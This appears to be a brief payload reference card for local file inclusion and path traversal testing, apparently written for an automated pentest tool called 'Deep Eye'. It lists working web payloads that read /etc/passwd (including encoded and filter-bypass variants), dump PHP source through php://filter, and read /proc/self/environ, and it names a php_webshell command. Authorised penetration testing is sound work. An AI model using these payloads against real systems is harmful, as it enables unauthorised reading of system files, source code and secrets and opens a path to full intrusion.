# LFI Payload Pack

**Trigger condition:** Manual LFI/path tests.

## Key Payloads
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
/proc/self/environ
```

## Tools Available
| Tool | Command | Purpose |
|------|---------|---------|
| Deep Eye | `lfi`, `path_traversal`, `php_webshell` | Auto |
